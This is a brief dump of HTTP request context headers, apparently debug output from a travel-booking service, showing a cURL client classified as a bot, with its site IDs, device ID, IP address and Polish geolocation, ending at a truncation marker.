HTTP_CTX_SITE_EAPID => 0
HTTP_CTX_SITE_TPID => 70125
HTTP_CTX_SITE_LOCALE => en_AU
HTTP_CTX_SITE_ID => 70125
HTTP_CTX_PARTNER_ACCOUNT_ID => d34ca89e-4f80-4815-8057-b91672192b53
HTTP_CTX_PRIVACY =>
HTTP_CTX_AGENT_DEVICE_ID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_EDGE_AGENT_TRAITS_CLASSIFICATION => UnknownBot
HTTP_EDGE_AGENT_TRAITS_ALIGNMENT_SCORE => 0.0
HTTP_EDGE_AGENT_TRAITS_BOTNESS_SCORE => 1.0
HTTP_EDGE_AGENT_GEOLOCATION_INFO => {"latitude":50.27,"longitude":19.02,"countryCode":"PL","regionCode":"","city":"KATOWICE","continent":"EU","postalCode":"","timezone":"+01:00","metroCode":-1}
HTTP_EDGE_AGENT_DEVICE_INFO => {"brandName":"cURL","modelName":"cURL","isTablet":false,"isMobile":false,"resolutionHeight":600,"resolutionWidth":800,"physicalScreenHeight":400,"physicalScreenWidth":400,"type":"DESKTOP"}
HTTP_EDGE_AGENT_IP => 89.74.158.194
HTTP_X_EXPEDIA_TPID => 70125
HTTP_CGP_AGENT_GEOLOCATION_INFO => {"latitude":50.27,"longitude":19.02,"countryCode":"PL","regionCode":"","city":"KATOWICE","continent":"EU","postalCode":"","timezone":"+01:00","metroCode":-1}
HTTP_CGP_AGENT_TRAITS_BOTNESS_SCORE => 1.0
HTTP_CGP_AGENT_TRAITS_CLASSIFICATION => UnknownBot
HTTP_X_CGP_ENV => ewecgp-prod
HTTP_X_CGP_REGION => eu-west-1
HTTP_CGP_AGENT_DEVICE_ID => 0c8072a3-7d9b-4be1-bbcf-d2acaaf8c627
HTTP_CGP_AGENT_TRAITS_ALIGNMENT_SCORE => 0.0
# … truncated …
```
